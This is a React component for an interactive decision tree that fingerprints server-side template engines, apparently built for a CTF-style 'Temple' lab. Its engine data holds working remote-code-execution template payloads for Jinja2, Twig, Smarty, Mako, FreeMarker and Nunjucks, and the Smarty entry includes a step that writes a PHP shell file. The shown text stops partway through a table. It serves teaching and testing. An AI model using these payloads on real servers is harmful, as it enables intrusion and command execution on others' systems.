import React, { useState, useMemo } from "react";
import {
  Terminal,
  Check,
  X,
  Copy,
  Zap,
  HelpCircle,
  Code2,
  ShieldCheck,
  ShieldAlert,
  Layers,
  Sparkles,
  ArrowRight,
  RefreshCw,
  Cpu,
} from "lucide-react";

/* ── Types & Interfaces ───────────────────────────────────────────────────── */

export type EngineId = "jinja2" | "twig" | "smarty" | "mako" | "unknown-curly" | "unknown-dollar" | "not-vulnerable";

export interface SstiEngineInfo {
  id: EngineId;
  name: string;
  language: string;
  frameworks: string[];
  description: string;
  probeBehavior: string;
  rceSnippet: string;
  color: "emerald" | "blue" | "purple" | "rose" | "amber";
}

export interface DecisionNode {
  id: string;
  label: string;
  code: string;
  type: "probe" | "leaf";
  engineId?: EngineId;
  description: string;
  expectedTrue?: string;
  expectedFalse?: string;
  successTarget?: string;
  failTarget?: string;
  x: number; // Percentage 0-100 on desktop canvas
  y: number; // Percentage 0-100 on desktop canvas
}

/* ── Engine Knowledge Base ────────────────────────────────────────────────── */

const ENGINE_DETAILS: Record<EngineId, SstiEngineInfo> = {
  jinja2: {
    id: "jinja2",
    name: "Jinja2 / Python",
    language: "Python",
    frameworks: ["Flask", "Django (with Jinja)", "FastAPI", "Ansible"],
    description:
      "Python's premier templating engine. In Jinja2, expressions are evaluated within {{ ... }}. String multiplication like '7'*7 replicates the string to produce '7777777'. RCE is achieved by traversing Python's object hierarchy to access os or subprocess.",
    probeBehavior:
      "{{7*'7'}} evaluates to '7777777' because Python supports string repetition through the * operator.",
    rceSnippet:
      "{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}",
    color: "emerald",
  },
  twig: {
    id: "twig",
    name: "Twig / PHP",
    language: "PHP",
    frameworks: ["Symfony", "Drupal", "Craft CMS", "Grav"],
    description:
      "PHP's modern templating engine. In PHP, strings multiplied by numbers undergo automatic loose type coercion: '7' is converted to integer 7, resulting in 49 rather than '7777777'.",
    probeBehavior:
      "{{7*'7'}} evaluates to 49 because PHP casts the string '7' to numeric 7 before computing 7 * 7.",
    rceSnippet:
      "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    color: "blue",
  },
  smarty: {
    id: "smarty",
    name: "Smarty / PHP",
    language: "PHP",
    frameworks: ["PrestaShop", "X-Cart", "Legacy CMS"],
    description:
      "A veteran PHP template engine. Smarty uses single curly braces { ... } or ${ ... } with distinct comment syntax {* ... *}. If comment tags are stripped silently, Smarty is confirmed.",
    probeBehavior:
      "a{*comment*}b returns 'ab' because Smarty strips out {*comment*} as a native template comment.",
    rceSnippet:
      "{system('id')} or {Smarty_Internal_Write_File::writeFile('shell.php','<?php phpinfo(); ?>',true)}",
    color: "emerald",
  },
  mako: {
    id: "mako",
    name: "Mako / Python",
    language: "Python",
    frameworks: ["Pyramid", "Pylons", "Turbogears"],
    description:
      "A fast Python templating engine that natively compiles templates to pure Python byte code. Supports inline Python expressions directly inside ${ ... } syntax.",
    probeBehavior:
      "${'z'.join('ab')} evaluates to 'azb' because Mako directly executes standard Python string methods inside ${...}.",
    rceSnippet:
      "${__import__('os').popen('id').read()}",
    color: "purple",
  },
  "unknown-curly": {
    id: "unknown-curly",
    name: "Unknown {{...}} Engine",
    language: "Unknown",
    frameworks: ["Nunjucks (Node.js)", "Pebble (Java)", "Tornado (Python)", "Liquid"],
    description:
      "The application evaluated {{7*7}} to 49, but the {{7*'7'}} test did not match Jinja2 or Twig. Test engine-specific built-ins like {{7*'7'}} in Nunjucks or Java reflection in Pebble.",
    probeBehavior:
      "Evaluated {{7*7}} to 49, but failed both Python string multiplication and PHP type coercion branches.",
    rceSnippet:
      "Check environment: {{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
    color: "amber",
  },
  "unknown-dollar": {
    id: "unknown-dollar",
    name: "Unknown ${...} Engine",
    language: "Unknown",
    frameworks: ["FreeMarker (Java)", "Velocity (Java)", "Pebble", "Groovy"],
    description:
      "The application evaluates ${7*7} to 49, but does not execute Mako Python methods or Smarty comments. This indicates a Java-based template engine like Apache FreeMarker or Velocity.",
    probeBehavior:
      "Evaluated ${7*7} to 49, but failed Smarty comment syntax and Mako join string evaluation.",
    rceSnippet:
      "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    color: "amber",
  },
  "not-vulnerable": {
    id: "not-vulnerable",
    name: "Not Vulnerable / Literal String",
    language: "N/A",
    frameworks: ["Static HTML", "Safe Context Binding", "Escaped Output"],
    description:
      "Neither ${7*7} nor {{7*7}} were calculated by the server. Input was either HTML entity encoded, echoed literally without passing to an engine, or passed safely through context arguments.",
    probeBehavior:
      "Inputs ${7*7} and {{7*7}} were printed literally without mathematical evaluation.",
    rceSnippet: "No SSTI exploit available. Test for XSS, SQLi, or Client-Side Template Injection (CSTI).",
    color: "rose",
  },
};

/* ── Tree Graph Node Coordinates ──────────────────────────────────────────── */

const NODES: DecisionNode[] = [
  // Level 0: Root
  {
    id: "root",
    label: "Root Expression Probe",
    code: "${7*7}",
    type: "probe",
    description: "Inject ${7*7} to test if the template engine uses dollar-brace syntax.",
    expectedTrue: "Evaluated (49)",
    expectedFalse: "Literal / Unhandled",
    successTarget: "smarty-comment",
    failTarget: "probe-curly",
    x: 8,
    y: 50,
  },

  // Level 1 (Top Branch): Dollar syntax match
  {
    id: "smarty-comment",
    label: "Smarty Comment Test",
    code: "a{*comment*}b",
    type: "probe",
    description: "Inject a{*comment*}b to test if the server strips native Smarty comment tags.",
    expectedTrue: "Returns 'ab' (Comment Stripped)",
    expectedFalse: "Literal / Error",
    successTarget: "leaf-smarty",
    failTarget: "probe-mako",
    x: 34,
    y: 24,
  },

  // Level 1 (Bottom Branch): Curly syntax fallback
  {
    id: "probe-curly",
    label: "Double Curly Test",
    code: "{{7*7}}",
    type: "probe",
    description: "Inject {{7*7}} to test if the server evaluates Jinja2, Twig, or Nunjucks expressions.",
    expectedTrue: "Evaluated (49)",
    expectedFalse: "Literal (Not Vulnerable)",
    successTarget: "probe-multiply",
    failTarget: "leaf-not-vulnerable",
    x: 34,
    y: 76,
  },

  // Level 2 (Top-Top): Leaf Smarty
  {
    id: "leaf-smarty",
    label: "Smarty Confirmed",
    code: "Smarty (PHP)",
    type: "leaf",
    engineId: "smarty",
    description: "Identified Smarty template engine (PHP stack).",
    x: 62,
    y: 12,
  },

  // Level 2 (Top-Mid): Probe Mako
  {
    id: "probe-mako",
    label: "Python Method Test",
    code: "${\"z\".join(\"ab\")}",
    type: "probe",
    description: "Inject ${\"z\".join(\"ab\")} to test for native Python string method execution.",
    expectedTrue: "Returns 'azb'",
    expectedFalse: "Literal / Error",
    successTarget: "leaf-mako",
    failTarget: "leaf-unknown-dollar",
    x: 62,
    y: 36,
  },

  // Level 2 (Bottom-Top): Probe Multiply (Jinja vs Twig)
  {
    id: "probe-multiply",
    label: "Type Multiplication Test",
    code: "{{7*'7'}}",
    type: "probe",
    description:
      "Inject {{7*'7'}} to differentiate between Python string repetition ('7777777') and PHP integer casting (49).",
    expectedTrue: "Returns '7777777' (Jinja2)",
    expectedFalse: "Returns 49 (Twig)",
    successTarget: "leaf-jinja2",
    failTarget: "leaf-twig",
    x: 62,
    y: 64,
  },

  // Level 2 (Bottom-Bottom): Leaf Not Vulnerable
  {
    id: "leaf-not-vulnerable",
    label: "No SSTI Detected",
    code: "Not Vulnerable",
    type: "leaf",
    engineId: "not-vulnerable",
    description: "Template expressions are not executed server-side.",
    x: 62,
    y: 88,
  },

  // Level 3 (Leaves)
  {
    id: "leaf-mako",
    label: "Mako Confirmed",
    code: "Mako (Python)",
    type: "leaf",
    engineId: "mako",
    description: "Identified Mako template engine (Python stack).",
    x: 88,
    y: 26,
  },
  {
    id: "leaf-unknown-dollar",
    label: "Java / Other ${...}",
    code: "Unknown ${...}",
    type: "leaf",
    engineId: "unknown-dollar",
    description: "Likely Java FreeMarker or Velocity template engine.",
    x: 88,
    y: 44,
  },
  {
    id: "leaf-jinja2",
    label: "Jinja2 Confirmed",
    code: "Jinja2 (Python)",
    type: "leaf",
    engineId: "jinja2",
    description: "Identified Jinja2 template engine (Flask / Python). This matches Temple!",
    x: 88,
    y: 58,
  },
  {
    id: "leaf-twig",
    label: "Twig Confirmed",
    code: "Twig (PHP)",
    type: "leaf",
    engineId: "twig",
    description: "Identified Twig template engine (PHP / Symfony).",
    x: 88,
    y: 74,
  },
  {
    id: "leaf-unknown-curly",
    label: "Nunjucks / Other {{...}}",
    code: "Unknown {{...}}",
    type: "leaf",
    engineId: "unknown-curly",
    description: "Likely Node.js Nunjucks or Java Pebble template engine.",
    x: 88,
    y: 88,
  },
];

/* ── Connection Edges ─────────────────────────────────────────────────────── */

interface TreeEdge {
  from: string;
  to: string;
  isSuccess: boolean;
  label: string;
}

const EDGES: TreeEdge[] = [
  // From Root
  { from: "root", to: "smarty-comment", isSuccess: true, label: "Evaluated (49)" },
  { from: "root", to: "probe-curly", isSuccess: false, label: "Literal / Error" },

  // From smarty-comment
  { from: "smarty-comment", to: "leaf-smarty", isSuccess: true, label: "Yields 'ab'" },
  { from: "smarty-comment", to: "probe-mako", isSuccess: false, label: "Literal 'a{*comment*}b'" },

  // From probe-mako
  { from: "probe-mako", to: "leaf-mako", isSuccess: true, label: "Yields 'azb'" },
  { from: "probe-mako", to: "leaf-unknown-dollar", isSuccess: false, label: "Literal / Error" },

  // From probe-curly
  { from: "probe-curly", to: "probe-multiply", isSuccess: true, label: "Evaluated (49)" },
  { from: "probe-curly", to: "leaf-not-vulnerable", isSuccess: false, label: "Literal / Error" },

  // From probe-multiply
  { from: "probe-multiply", to: "leaf-jinja2", isSuccess: true, label: "Yields '7777777'" },
  { from: "probe-multiply", to: "leaf-twig", isSuccess: false, label: "Yields 49" },
  { from: "probe-multiply", to: "leaf-unknown-curly", isSuccess: false, label: "Error / Other" },
];

/* ── Path Presets ─────────────────────────────────────────────────────────── */

const PRESETS: Record<string, { label: string; path: string[]; targetEngine: EngineId }> = {
  temple: {
    label: "Temple Machine (Jinja2)",
    path: ["root", "probe-curly", "probe-multiply", "leaf-jinja2"],
    targetEngine: "jinja2",
  },
  twig: {
    label: "PHP Symfony (Twig)",
    path: ["root", "probe-curly", "probe-multiply", "leaf-twig"],
    targetEngine: "twig",
  },
  smarty: {
    label: "PHP PrestaShop (Smarty)",
    path: ["root", "smarty-comment", "leaf-smarty"],
    targetEngine: "smarty",
  },
  mako: {
    label: "Python Pyramid (Mako)",
    path: ["root", "smarty-comment", "probe-mako", "leaf-mako"],
    targetEngine: "mako",
  },
  safe: {
    label: "Not Vulnerable",
    path: ["root", "probe-curly", "leaf-not-vulnerable"],
    targetEngine: "not-vulnerable",
  },
};

/* ── Helper: Copy to Clipboard ────────────────────────────────────────────── */

function CopyButton({ text, className = "" }: { text: string; className?: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = (e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      onClick={handleCopy}
      className={`inline-flex items-center gap-1 rounded border border-border/60 bg-muted/60 px-2 py-0.5 text-[10px] font-mono text-muted-foreground hover:text-foreground hover:bg-muted transition-colors cursor-pointer ${className}`}
      title="Copy payload"
    >
      {copied ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
      <span>{copied ? "Copied" : "Copy"}</span>
    </button>
  );
}

/* ── Main Component ───────────────────────────────────────────────────────── */

export function SstiDecisionTree({
  defaultPreset = "temple",
  className = "",
}: {
  defaultPreset?: string;
  className?: string;
}) {
  const [activeTab, setActiveTab] = useState<"tree" | "wizard" | "matrix">("tree");
  const [selectedNodeId, setSelectedNodeId] = useState<string>("leaf-jinja2");
  const [highlightedPath, setHighlightedPath] = useState<string[]>(
    PRESETS[defaultPreset]?.path || PRESETS["temple"].path,
  );
  const [activePreset, setActivePreset] = useState<string>(defaultPreset);

  // Diagnostic Wizard State
  const [wizardStep1, setWizardStep1] = useState<"49" | "literal" | null>("literal");
  const [wizardStep2Top, setWizardStep2Top] = useState<"ab" | "literal" | null>(null);
  const [wizardStep3Mako, setWizardStep3Mako] = useState<"azb" | "literal" | null>(null);
  const [wizardStep2Bottom, setWizardStep2Bottom] = useState<"49" | "literal" | null>("49");
  const [wizardStep3Bottom, setWizardStep3Bottom] = useState<"7777777" | "49" | "other" | null>(
    "7777777",
  );

  // Selected engine details
  const selectedNode = useMemo(() => NODES.find((n) => n.id === selectedNodeId), [selectedNodeId]);
  const activeEngine = useMemo(() => {
    if (selectedNode?.engineId) {
      return ENGINE_DETAILS[selectedNode.engineId];
    }
    return ENGINE_DETAILS["jinja2"];
  }, [selectedNode]);

  // Handle Preset change
  const applyPreset = (key: string) => {
    const preset = PRESETS[key];
    if (!preset) return;
    setActivePreset(key);
    setHighlightedPath(preset.path);
    const lastNodeId = preset.path[preset.path.length - 1];
    setSelectedNodeId(lastNodeId);

    // Sync wizard state
    if (key === "temple") {
      setWizardStep1("literal");
      setWizardStep2Bottom("49");
      setWizardStep3Bottom("7777777");
    } else if (key === "twig") {
      setWizardStep1("literal");
      setWizardStep2Bottom("49");
      setWizardStep3Bottom("49");
    } else if (key === "smarty") {
      setWizardStep1("49");
      setWizardStep2Top("ab");
    } else if (key === "mako") {
      setWizardStep1("49");
      setWizardStep2Top("literal");
      setWizardStep3Mako("azb");
    } else if (key === "safe") {
      setWizardStep1("literal");
      setWizardStep2Bottom("literal");
    }
  };

  // Node Click handler
  const handleNodeClick = (node: DecisionNode) => {
    setSelectedNodeId(node.id);
    setActivePreset("");

    // Build path up to this node if it connects to root
    const path: string[] = [node.id];
    let current = node.id;
    while (current !== "root") {
      const incomingEdge = EDGES.find((e) => e.to === current);
      if (incomingEdge) {
        path.unshift(incomingEdge.from);
        current = incomingEdge.from;
      } else {
        break;
      }
    }
    setHighlightedPath(path);
  };

  return (
    <div
      className={`my-8 rounded-xl border border-border/80 bg-card/95 shadow-2xl overflow-hidden font-sans backdrop-blur-md ${className}`}
    >
      {/* ── Terminal Header Bar ────────────────────────────────────────────── */}
      <div className="flex flex-wrap items-center justify-between gap-3 px-4 py-3 border-b border-border bg-muted/40">
        <div className="flex items-center gap-2.5">
          <div className="flex h-7 w-7 items-center justify-center rounded bg-accent-primary/20 text-accent-primary border border-accent-primary/30">
            <Zap className="h-4 w-4" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-xs font-bold uppercase tracking-[0.2em] text-foreground font-mono">
                SSTI_DIAGNOSTIC_TREE.PROTOCOL
              </span>
              <span className="inline-flex items-center gap-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 text-[9px] font-mono text-emerald-400 font-semibold uppercase tracking-wider">
                <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
                Live Interactive
              </span>
            </div>
            <p className="text-[11px] text-muted-foreground">
              PortSwigger Template Injection Decision Graph & Engine Fingerprinting
            </p>
          </div>
        </div>

        {/* View Switcher Tabs */}
        <div className="flex items-center gap-1 rounded-lg border border-border/60 bg-background/80 p-1">
          <button
            onClick={() => setActiveTab("tree")}
            className={`flex items-center gap-1.5 rounded px-3 py-1 text-xs font-medium transition-all cursor-pointer ${
              activeTab === "tree"
                ? "bg-accent-primary text-background font-semibold shadow-sm"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <Layers className="h-3.5 w-3.5" />
            <span>Interactive Graph</span>
          </button>
          <button
            onClick={() => setActiveTab("wizard")}
            className={`flex items-center gap-1.5 rounded px-3 py-1 text-xs font-medium transition-all cursor-pointer ${
              activeTab === "wizard"
                ? "bg-accent-primary text-background font-semibold shadow-sm"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <Sparkles className="h-3.5 w-3.5" />
            <span>Diagnostic Wizard</span>
          </button>
          <button
            onClick={() => setActiveTab("matrix")}
            className={`flex items-center gap-1.5 rounded px-3 py-1 text-xs font-medium transition-all cursor-pointer ${
              activeTab === "matrix"
                ? "bg-accent-primary text-background font-semibold shadow-sm"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            <Code2 className="h-3.5 w-3.5" />
            <span>Engine Matrix</span>
          </button>
        </div>
      </div>

      {/* ── Preset Bar ─────────────────────────────────────────────────────── */}
      <div className="flex flex-wrap items-center justify-between gap-2 px-4 py-2 border-b border-border/50 bg-background/40 text-xs">
        <div className="flex items-center gap-2 text-muted-foreground">
          <span className="text-[10px] font-mono uppercase tracking-wider font-semibold">
            Quick Target Presets:
          </span>
          <div className="flex flex-wrap gap-1.5">
            {Object.entries(PRESETS).map(([key, p]) => (
              <button
                key={key}
                onClick={() => applyPreset(key)}
                className={`rounded border px-2.5 py-0.5 text-[11px] font-mono transition-all cursor-pointer ${
                  activePreset === key
                    ? "border-accent-primary bg-accent-primary/20 text-accent-primary font-bold shadow-sm"
                    : "border-border/50 bg-muted/30 text-muted-foreground hover:text-foreground hover:border-border"
                }`}
              >
                {p.label}
              </button>
            ))}
          </div>
        </div>

        <button
          onClick={() => applyPreset("temple")}
          className="flex items-center gap-1 text-[11px] font-mono text-muted-foreground hover:text-foreground transition-colors cursor-pointer"
          title="Reset to Temple default path"
        >
          <RefreshCw className="h-3 w-3" />
          <span>Reset</span>
        </button>
      </div>

      {/* ── Tab Content 1: Interactive Visual Tree ─────────────────────────── */}
      {activeTab === "tree" && (
        <div className="relative p-4 md:p-6 bg-radial from-background/90 to-background overflow-x-auto min-h-[440px]">
          {/* Legend Banner */}
          <div className="flex flex-wrap items-center justify-between gap-3 mb-4 px-3 py-2 rounded-lg border border-border/50 bg-muted/20 text-xs">
            <div className="flex items-center gap-4">
              <span className="flex items-center gap-1.5 font-mono text-[11px] text-emerald-400">
                <span className="h-2 w-2 rounded-full bg-emerald-400" />
                Green Branch: Evaluated / Match
              </span>
              <span className="flex items-center gap-1.5 font-mono text-[11px] text-rose-400">
                <span className="h-2 w-2 rounded-full bg-rose-400" />
                Red Branch: Literal / Fail
              </span>
            </div>
            <span className="text-[11px] text-muted-foreground">
              Click any node to trace the attack chain and view the RCE exploit dossier.
            </span>
          </div>

          {/* SVG Connector Canvas */}
          <div className="relative w-full min-w-[760px] h-[360px] select-none">
            <svg
              className="absolute inset-0 w-full h-full pointer-events-none"
              style={{ overflow: "visible" }}
            >
              <defs>
                {/* Glow Filter */}
                <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
                  <feGaussianBlur stdDeviation="3" result="blur" />
                  <feComposite in="SourceGraphic" in2="blur" operator="over" />
                </filter>
              </defs>

              {/* Render Connection Edges */}
              {EDGES.map((edge, idx) => {
                const source = NODES.find((n) => n.id === edge.from);
                const target = NODES.find((n) => n.id === edge.to);
                if (!source || !target) return null;

                const isPathActive =
                  highlightedPath.includes(edge.from) && highlightedPath.includes(edge.to);

                // Bezier Curve
                const x1 = source.x;
                const y1 = source.y;
                const x2 = target.x;
                const y2 = target.y;
                const midX = (x1 + x2) / 2;

                const strokeColor = edge.isSuccess ? "#10b981" : "#f43f5e";
                const activeStroke = edge.isSuccess ? "#34d399" : "#fb7185";

                return (
                  <g key={idx}>
                    {/* Background track */}
                    <path
                      d={`M ${x1}% ${y1}% C ${midX}% ${y1}%, ${midX}% ${y2}%, ${x2}% ${y2}%`}
                      fill="none"
                      stroke={strokeColor}
                      strokeWidth={isPathActive ? 3.5 : 1.5}
                      strokeOpacity={isPathActive ? 0.95 : 0.25}
                      strokeDasharray={isPathActive ? "none" : "4,4"}
                      filter={isPathActive ? "url(#glow)" : undefined}
                      className="transition-all duration-300"
                    />

                    {/* Animated pulse packet on active paths */}
                    {isPathActive && (
                      <circle r="4" fill="#ffffff" filter="url(#glow)">
                        <animateMotion
                          path={`M ${x1}% ${y1}% C ${midX}% ${y1}%, ${midX}% ${y2}%, ${x2}% ${y2}%`}
                          dur="2s"
                          repeatCount="indefinite"
                        />
                      </circle>
                    )}
                  </g>
                );
              })}
            </svg>

            {/* Render Nodes */}
            {NODES.map((node) => {
              const isSelected = selectedNodeId === node.id;
              const isInPath = highlightedPath.includes(node.id);
              const isLeaf = node.type === "leaf";

              let nodeClasses = "";
              if (isLeaf) {
                if (node.engineId === "not-vulnerable") {
                  nodeClasses = isInPath
                    ? "border-rose-500 bg-rose-500/20 text-rose-300 ring-2 ring-rose-500/40"
                    : "border-rose-500/40 bg-rose-500/10 text-rose-400/80";
                } else if (node.engineId?.startsWith("unknown")) {
                  nodeClasses = isInPath
                    ? "border-amber-500 bg-amber-500/20 text-amber-300 ring-2 ring-amber-500/40"
                    : "border-amber-500/40 bg-amber-500/10 text-amber-400/80";
                } else {
                  nodeClasses = isInPath
                    ? "border-emerald-500 bg-emerald-500/20 text-emerald-300 ring-2 ring-emerald-500/40"
                    : "border-emerald-500/40 bg-emerald-500/10 text-emerald-400/80";
                }
              } else {
                nodeClasses = isInPath
                  ? "border-sky-400 bg-sky-500/20 text-sky-200 ring-2 ring-sky-400/40"
                  : "border-border bg-card/90 text-foreground hover:border-sky-400/60";
              }

              return (
                <div
                  key={node.id}
                  onClick={() => handleNodeClick(node)}
                  style={{
                    left: `${node.x}%`,
                    top: `${node.y}%`,
                    transform: "translate(-50%, -50%)",
                  }}
                  className={`absolute z-10 cursor-pointer rounded-lg border px-3 py-2 transition-all duration-200 shadow-md ${nodeClasses} ${
                    isSelected ? "scale-105 shadow-xl" : "hover:scale-102"
                  }`}
                >
                  <div className="flex items-center gap-1.5">
                    {isLeaf ? (
                      node.engineId === "not-vulnerable" ? (
                        <ShieldAlert className="h-3.5 w-3.5 text-rose-400 shrink-0" />
                      ) : (
                        <ShieldCheck className="h-3.5 w-3.5 text-emerald-400 shrink-0" />
                      )
                    ) : (
                      <Terminal className="h-3.5 w-3.5 text-sky-400 shrink-0" />
                    )}
                    <span className="font-mono text-xs font-bold tracking-tight">
                      {node.code}
                    </span>
                  </div>

                  <div className="text-[10px] text-muted-foreground/80 mt-0.5 truncate max-w-[130px]">
                    {node.label}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* ── Tab Content 2: Guided Diagnostic Wizard ────────────────────────── */}
      {activeTab === "wizard" && (
        <div className="p-5 md:p-6 space-y-6 bg-muted/10">
          <div className="flex items-center gap-2 border-b border-border/60 pb-3">
            <Sparkles className="h-4 w-4 text-accent-primary" />
            <h4 className="text-sm font-bold uppercase tracking-wider text-foreground">
              Step-by-Step Live Target Diagnostic
            </h4>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {/* Step 1 */}
            <div className="rounded-lg border border-border bg-card p-4 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">
                  Step 01: Dollar Syntax
                </span>
                <CopyButton text="${7*7}" />
              </div>
              <div className="font-mono text-sm font-bold text-sky-400 bg-muted/40 p-2 rounded">
                Probe: ${"{7*7}"}
              </div>
              <p className="text-xs text-muted-foreground">
                Does the web application mathematically evaluate the payload to 49?
              </p>
              <div className="flex gap-2">
                <button
                  onClick={() => {
                    setWizardStep1("49");
                    applyPreset("smarty");
                  }}
                  className={`flex-1 py-1.5 px-2 rounded text-xs font-mono font-semibold transition-all ${
                    wizardStep1 === "49"
                      ? "bg-emerald-500 text-black shadow"
                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  ✓ Evaluated (49)
                </button>
                <button
                  onClick={() => {
                    setWizardStep1("literal");
                    setWizardStep2Bottom("49");
                    setWizardStep3Bottom("7777777");
                    applyPreset("temple");
                  }}
                  className={`flex-1 py-1.5 px-2 rounded text-xs font-mono font-semibold transition-all ${
                    wizardStep1 === "literal"
                      ? "bg-rose-500 text-white shadow"
                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  ✗ Literal / Ignored
                </button>
              </div>
            </div>

            {/* Step 2 */}
            <div className="rounded-lg border border-border bg-card p-4 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">
                  Step 02: Syntax Branch
                </span>
                <CopyButton text={wizardStep1 === "49" ? "a{*comment*}b" : "{{7*7}}"} />
              </div>
              <div className="font-mono text-sm font-bold text-sky-400 bg-muted/40 p-2 rounded">
                {wizardStep1 === "49" ? "Probe: a{*comment*}b" : "Probe: {{7*7}}"}
              </div>
              <p className="text-xs text-muted-foreground">
                {wizardStep1 === "49"
                  ? "Does the output strip the comment and return 'ab'?"
                  : "Does injecting double curly braces return 49?"}
              </p>
              <div className="flex gap-2">
                <button
                  onClick={() => {
                    if (wizardStep1 === "49") {
                      setWizardStep2Top("ab");
                      applyPreset("smarty");
                    } else {
                      setWizardStep2Bottom("49");
                      applyPreset("temple");
                    }
                  }}
                  className={`flex-1 py-1.5 px-2 rounded text-xs font-mono font-semibold transition-all ${
                    (wizardStep1 === "49" && wizardStep2Top === "ab") ||
                    (wizardStep1 === "literal" && wizardStep2Bottom === "49")
                      ? "bg-emerald-500 text-black shadow"
                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  ✓ Evaluated / Stripped
                </button>
                <button
                  onClick={() => {
                    if (wizardStep1 === "49") {
                      setWizardStep2Top("literal");
                      applyPreset("mako");
                    } else {
                      setWizardStep2Bottom("literal");
                      applyPreset("safe");
                    }
                  }}
                  className={`flex-1 py-1.5 px-2 rounded text-xs font-mono font-semibold transition-all ${
                    (wizardStep1 === "49" && wizardStep2Top === "literal") ||
                    (wizardStep1 === "literal" && wizardStep2Bottom === "literal")
                      ? "bg-rose-500 text-white shadow"
                      : "bg-muted/60 text-muted-foreground hover:bg-muted"
                  }`}
                >
                  ✗ Literal / Failed
                </button>
              </div>
            </div>

            {/* Step 3 */}
            <div className="rounded-lg border border-border bg-card p-4 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">
                  Step 03: Engine Disambiguation
                </span>
                <CopyButton
                  text={wizardStep1 === "49" ? "${'z'.join('ab')}" : "{{7*'7'}}"}
                />
              </div>
              <div className="font-mono text-sm font-bold text-sky-400 bg-muted/40 p-2 rounded">
                {wizardStep1 === "49" ? 'Probe: ${\"z\".join(\"ab\")}' : "Probe: {{7*'7'}}"}
              </div>
              <p className="text-xs text-muted-foreground">
                {wizardStep1 === "49"
                  ? "Tests Mako native Python string join execution."
                  : "Differentiates Jinja2 ('7777777') from Twig (49)."}
              </p>
              <div className="flex flex-col gap-2">
                {wizardStep1 === "literal" ? (
                  <>
                    <button
                      onClick={() => {
                        setWizardStep3Bottom("7777777");
                        applyPreset("temple");
                      }}
                      className={`py-1 px-2 rounded text-xs font-mono font-semibold transition-all ${
                        wizardStep3Bottom === "7777777"
                          ? "bg-emerald-500 text-black shadow"
                          : "bg-muted/60 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      '7777777' ➔ Jinja2 (Python) [Temple Target]
                    </button>
                    <button
                      onClick={() => {
                        setWizardStep3Bottom("49");
                        applyPreset("twig");
                      }}
                      className={`py-1 px-2 rounded text-xs font-mono font-semibold transition-all ${
                        wizardStep3Bottom === "49"
                          ? "bg-blue-500 text-white shadow"
                          : "bg-muted/60 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      49 ➔ Twig (PHP)
                    </button>
                  </>
                ) : (
                  <>
                    <button
                      onClick={() => {
                        setWizardStep3Mako("azb");
                        applyPreset("mako");
                      }}
                      className={`py-1 px-2 rounded text-xs font-mono font-semibold transition-all ${
                        wizardStep3Mako === "azb"
                          ? "bg-purple-500 text-white shadow"
                          : "bg-muted/60 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      'azb' ➔ Mako (Python)
                    </button>
                    <button
                      onClick={() => {
                        setWizardStep3Mako("literal");
                        setSelectedNodeId("leaf-unknown-dollar");
                      }}
                      className={`py-1 px-2 rounded text-xs font-mono font-semibold transition-all ${
                        wizardStep3Mako === "literal"
                          ? "bg-amber-500 text-black shadow"
                          : "bg-muted/60 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      Error ➔ Unknown / FreeMarker
                    </button>
                  </>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── Tab Content 3: Engine Comparison Matrix ────────────────────────── */}
      {activeTab === "matrix" && (
        <div className="p-4 md:p-6 overflow-x-auto">
          <table className="w-full text-left text-xs font-sans border-collapse">
            <thead>
              <tr className="border-b border-border bg-muted/30 font-mono text-muted-foreground">
                <th className="p-3">Engine</th>
                <th className="p-3">Language</th>
                <th className="p-3">Probe Behavior</th>
                <th className="p-3">Key Frameworks</th>
                <th className="p-3">Canonical RCE Mechanism</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border/40 font-mono">
              <tr className="hover:bg-muted/20 transition-colors">
                <td className="p-3 font-bold text-emerald-400">Jinja2</td>
                <td className="p-3">Python</td>
                <td className="p-3 text-muted-foreground">
                  {"{{7*'7'}}"} ➔ <span className="text-emerald-300 font-bold">'7777777'</span>
                </td>
                <td className="p-3 text-muted-foreground">Flask, Django, FastAPI</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    cycler.__init__.__globals__['os'].popen()
                  </code>
                </td>
              </tr>
              <tr className="hover:bg-muted/20 transition-colors">
                <td className="p-3 font-bold text-blue-400">Twig</td>
                <td className="p-3">PHP</td>
                <td className="p-3 text-muted-foreground">
                  {"{{7*'7'}}"} ➔ <span className="text-blue-300 font-bold">49</span> (numeric cast)
                </td>
                <td className="p-3 text-muted-foreground">Symfony, Craft CMS</td>
                <td className="p-3">
                  <code className="text-[11px] text-sky-300">
                    _self.env.registerUndefinedFilterCallback()
                  </code>
                </td>
              </tr>
